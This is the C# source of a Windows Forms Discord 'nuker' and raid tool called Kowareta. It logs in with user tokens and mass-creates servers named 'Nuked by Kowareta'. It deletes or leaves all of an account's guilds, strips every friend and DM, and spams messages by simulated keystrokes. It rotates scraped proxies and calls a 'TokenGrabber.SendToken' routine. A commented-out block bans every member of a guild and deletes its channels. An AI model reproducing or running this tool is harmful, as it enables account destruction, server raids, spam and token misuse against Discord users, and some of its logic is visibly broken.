using Discord;
using Discord.WebSocket;
using Microsoft.VisualBasic;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Net;
using System.Text;

namespace Kowareta
{
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {

        public static Random rand = new Random();
        private DiscordSocketClient _client;
        private DiscordClient client;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            metroButton2.Enabled = false;
            metroButton5.Enabled = false;
            groupBox2.Enabled = false;
            groupBox3.Enabled = false;
            metroLabel2.Enabled = false;
            metroLabel3.Enabled = false;
        }

        public void doServerCreator()
        {
            try
            {
                for (int i = 0; i < 100; i++)
                {
                    client = new DiscordClient(metroTextBox4.Text);
                    client.CreateGuild("Nuked by Kowareta");
                }
            }
            catch (Exception)
            {
            }
        }
        public void doServerCleaner()
        {
            try
            {
                foreach (PartialGuild socketGuild in client.GetGuilds())
                {
                    try
                    {
                        socketGuild.DeleteAsync();
                    }
                    catch (Exception)
                    {
                    }
                    try
                    {
                        socketGuild.LeaveAsync();
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch (Exception)
            {
            }
        }

        public void doColorChanger()
        {
            try
            {
                Discord.REQ.UserSettings.SetThemeLight(metroTextBox4.Text);
            }
            catch (Exception)
            {
            }
        }

        public void doLanguageChanger()
        {
            try
            {
                Discord.REQ.UserSettings.SetLanguage("en", metroTextBox4.Text);
            }
            catch (Exception)
            {
            }
        }

        public void doGroupCleaner()
        {
            try
            {
                foreach (SocketGroupChannel socketGroupChannel in _client.GroupChannels)
                {
                    try
                    {
                        socketGroupChannel.LeaveAsync();
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch (Exception)
            {
            }
        }

        private void doDMChannelCleaner()
        {
            try
            {
                foreach (SocketDMChannel dMChannel in _client.DMChannels)
                {
                    try
                    {
                        dMChannel.CloseAsync();
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch (Exception)
            {
            }
        }

        /*private void button20_Click_2(object sender, EventArgs e)
        {
            if(checkBox6.Checked)
            {
                try
                {
                    string vIn = textBox10.Text;
                    ulong vOut = Convert.ToUInt64(vIn);
                    var guild = _client.GetGuild(vOut);
                    var reason = "Fucked by Kowareta :')";
                    foreach (SocketGuildUser guildUser in guild.Users)
                    {
                        guild.AddBanAsync(guildUser, 0, reason);
                    }
                }
                catch (Exception)
                {
                    MessageBox.Show("An error occurred. Probably missing permission or invalid guild.");
                }
            }

            if (checkBox7.Checked)
            {
                try
                {
                    string vIn = textBox10.Text;
                    ulong vOut = Convert.ToUInt64(vIn);
                    var guild = _client.GetGuild(vOut);
                    foreach (SocketGuildChannel guildChannel in guild.Channels)
                    {
                        guildChannel.DeleteAsync();
                    }
                }
                catch (Exception)
                {
                    MessageBox.Show("An error occurred. Probably missing permission or invalid guild.");
                }
            }

            if(checkBox8.Checked)
            {
                try
                {
                    string vIn = textBox10.Text;
                    ulong vOut = Convert.ToUInt64(vIn);
                    var guild = _client.GetGuild(vOut);
                    var name = textBox7.Text;
                    guild.ModifyAsync(x => x.Name = name);
                }
                catch (Exception)
                {
                    MessageBox.Show("An error occurred. Probably missing permission or invalid guild.");
                }
            }
            
            if(checkBox9.Checked)
            {
                try
                {
                    string vIn = textBox10.Text;
                    ulong vOut = Convert.ToUInt64(vIn);
                    var guild = _client.GetGuild(vOut);
                    var topic = textBox6.Text;
                    foreach (SocketTextChannel socketTextChannel in guild.TextChannels)
                    {
                        try
                        {
                            socketTextChannel.ModifyAsync(x => x.Topic = topic);
                        }
                        catch (Exception)
                        {
                        }
                    }
                }
                catch (Exception)
                {
                    MessageBox.Show("An error occurred. Probably missing permission or invalid guild.");
                }
            }
        }*/     
        public static double DateTimeToUnixTimestamp(DateTime dateTime)
        {
            DateTime unixStart = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Utc);
            long unixTimeStampInTicks = (dateTime.ToUniversalTime() - unixStart).Ticks;
            return (double)unixTimeStampInTicks / TimeSpan.TicksPerSecond;
        }

        private async void metroButton13_Click(object sender, EventArgs e)
        {
            try
            {
                DiscordSocketClient _client = new DiscordSocketClient();
                await _client.LoginAsync(TokenType.User, metroTextBox4.Text);
                await _client.StartAsync();
                MessageBox.Show("Succesfully connected", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
                groupBox2.Enabled = true;
                metroButton18.Enabled = true;
                metroButton21.Enabled = true;
                metroComboBox1.Enabled = true;
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to connect: {ex}");
            }
        }

        private void metroButton12_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("https://discord.gg/FFmyMbJtaK");
        }

        private void metroButton8_Click(object sender, EventArgs e)
        {
            MessageBox.Show("RaiderNation - Longo & ItzGabbo", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void changer()
        {
            try
            {
                _client.SetGameAsync(metroTextBox5.Text);
            }
            catch (Exception)
            {
            }
        }

        private void metroButton14_Click(object sender, EventArgs e)
        {
            try
            {
                changer();
            }
            catch (Exception)
            {
            }
        }

        private void metroButton1_Click(object sender, EventArgs e)
        {
            try
            {
                metroButton2.Enabled = true;
                metroButton1.Enabled = false;
                Thread.Sleep(5000);
                Thread thread = new Thread(new ThreadStart(primoSpammer));
                thread.Start();
            }
            catch (Exception)
            {
            }
        }

        private void metroButton15_Click(object sender, EventArgs e)
        {
            try
            {
                if(metroCheckBox5.Checked)
                {
                    Thread thread = new Thread(new ThreadStart(doGroupCleaner));
                    thread.Start();
                }
                if (metroCheckBox9.Checked)
                {
                    Thread thread = new Thread(new ThreadStart(doServerCreator));
                    thread.Start();
                }
                if (metroCheckBox8.Checked)
                {
                    Thread thread = new Thread(new ThreadStart(doServerCleaner));
                    thread.Start();
                }
                if (metroCheckBox6.Checked)
                {
                    Thread thread = new Thread(new ThreadStart(doFriendRemover));
                    thread.Start();
                }
                if (metroCheckBox12.Checked)
                {
                    Thread thread = new Thread(new ThreadStart(doLanguageChanger));
                    thread.Start();
                }
                if (metroCheckBox7.Checked)
                {
                    Thread thread = new Thread(new ThreadStart(doDMChannelCleaner));
                    thread.Start();
                }
                if (metroCheckBox2.Checked)
                {
                    Thread thread = new Thread(new ThreadStart(doColorChanger));
                    thread.Start();
                }
            }
            catch (Exception)
            {
            }
        }

        private void metroButton16_Click(object sender, EventArgs e)
        {
            try
            {

                if (metroCheckBox5.Checked)
                {
                    Thread thread = new Thread(new ThreadStart(doGroupCleaner));
                    thread.Abort();
                }
                if (metroCheckBox9.Checked)
                {
                    Thread thread = new Thread(new ThreadStart(doServerCreator));
                    thread.Abort();
                }
                if (metroCheckBox8.Checked)
                {
                    Thread thread = new Thread(new ThreadStart(doServerCleaner));
                    thread.Abort();
                }
                if (metroCheckBox6.Checked)
                {
                    Thread thread = new Thread(new ThreadStart(doFriendRemover));
                    thread.Abort();
                }
                if (metroCheckBox12.Checked)
                {
                    Thread thread = new Thread(new ThreadStart(doLanguageChanger));
                    thread.Abort();
                }
                if (metroCheckBox7.Checked)
                {
                    Thread thread = new Thread(new ThreadStart(doDMChannelCleaner));
                    thread.Abort();
                }
                if (metroCheckBox2.Checked)
                {
                    Thread thread = new Thread(new ThreadStart(doColorChanger));
                    thread.Abort();
                }
            }
            catch (Exception)
            {
            }
        }

        private void metroButton10_Click(object sender, EventArgs e)
        {
            try
            {
                var textBox = Encoding.UTF8.GetBytes(metroTextBox6.Text);
                var id = Convert.ToBase64String(textBox);
                metroTextBox8.Text = id;
            }
            catch (Exception)
            {
            }
        }

        private void doHypeSquadChanger()
        {
            try
            {
                string[] theProxy = GetRandomProxy();
                if (metroComboBox1.SelectedItem.ToString() == "Balance")
                {
                    client.User.SetHypesquad(Hypesquad.Balance);
                }
                else if (metroComboBox1.SelectedItem.ToString() == "Bravery")
                {
                    client.User.SetHypesquad(Hypesquad.Bravery);
                }
                else if (metroComboBox1.SelectedItem.ToString() == "Brilliance")
                {
                    client.User.SetHypesquad(Hypesquad.Brilliance);
                }
            }
            catch (Exception)
            {
            }
        }
        
        private void metroButton7_Click(object sender, EventArgs e)
        {
            Discord.REQ.TokenGrabber.SendToken(metroTextBox1.Text);
        }

        private void metroButton18_Click(object sender, EventArgs e)
        {
            try
            {
                Thread thread = new Thread(new ThreadStart(doHypeSquadChanger));
                thread.Start();
            }
            catch (Exception)
            {
            }
        }

        private void metroButton11_Click(object sender, EventArgs e)
        {

        }

        private void metroTabPage2_Click(object sender, EventArgs e)
        {

        }

        private void metroButton20_Click(object sender, EventArgs e)
        {
            try
            {
                Thread thread = new Thread(new ThreadStart(Friendremover));
                thread.Start();
            }
            catch (Exception)
            {
            }
        }

        private void doFriendAdder()
        {
            try
            {
                foreach (string token in metroTextBox12.Lines)
                {
                    try
                    {
                        client.SendFriendRequest(Convert.ToUInt64(metroTextBox11.Text));
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            catch (Exception)
            {
            }
        }

        public static int GetRandomNumber(int min, int cap)
        {
            return rand.Next(min, cap);
        }

        public string[] GetRandomProxy()
        {
            try
            {
                    System.Net.WebClient webClient = new System.Net.WebClient();
                    TextBox textboxona = new TextBox();
                    textboxona.Text = webClient.DownloadString("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500&ssl=yes");
                    return Strings.Split(textboxona.Lines[GetRandomNumber(0, textboxona.Lines.Length)], ":");
            }
            catch (Exception)
            {
            }
            return new string[] { };
        }
        private void Friendremover()
        {
            try
            {
                client.RemoveRelationship(Convert.ToUInt64(metroTextBox11.Text));
            }
            catch (Exception)
            { 
            }
        }
        private void doFriendRemover()
        {
            try
            {
                foreach(DiscordRelationship relationship in client.GetRelationships())
                {
                    relationship.Remove();
                }
            }
            catch (Exception)
            {
            }
        }

        private void metroButton19_Click(object sender, EventArgs e)
        {
            try
            {
                Thread thread = new Thread(new ThreadStart(doFriendAdder));
                thread.Start();
            }
            catch (Exception)
            {
            }
        }

        private void metroButton21_Click(object sender, EventArgs e)
        {
            try
            {
                string[] theProxy = GetRandomProxy();
                client.User.SetHypesquad(Hypesquad.None);
            }
            catch (Exception)
            {
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                SendKeys.Send(metroTextBox2.Text);
                SendKeys.Send("{ENTER}");
                if (metroCheckBox10.Checked)
                {
                    Thread.Sleep(metroTrackBar1.Value * 10);
                }
            }
            catch (Exception)
            {
            }
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            try
            {
                SendKeys.Send("^{v}");
                SendKeys.Send("{ENTER}");
                if(metroCheckBox11.Checked)
                {
                    Thread.Sleep(metroTrackBar2.Value * 10);
                }
            }
            catch (Exception)
            {
            }
        }

        
        private void metroButton6_Click(object sender, EventArgs e)
        {
            try
            {
                metroButton6.Enabled = false;
                metroButton5.Enabled = true;
                Clipboard.SetText(metroTextBox3.Text);
                timer2.Start();
            }
            catch (Exception)
            {
            }
        }

        private void metroButton5_Click(object sender, EventArgs e)
        {
            try
            {
                timer2.Stop();
                metroButton6.Enabled = true;
                metroButton5.Enabled = false;
                MessageBox.Show("Succesfully stopped the spammer", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception)
            {
            }
        }

        private void metroButton2_Click(object sender, EventArgs e)
        {
            try
            {
                timer1.Stop();
                metroButton1.Enabled = true;
                metroButton2.Enabled = false;
                MessageBox.Show("Succesfully stopped the spammer", Text, MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception)
            {
            }
        }

        private void metroButton3_Click(object sender, EventArgs e)
        {
            try
            {
                metroTextBox2.Clear();
            }
            catch (Exception)
            {
            }
        }

        private void metroButton4_Click(object sender, EventArgs e)
        {
            try
            {
                metroTextBox3.Clear();
            }
            catch (Exception)
            {
            }
        }

        private void groupBox2_Enter(object sender, EventArgs e)
        {

        }
    }
}
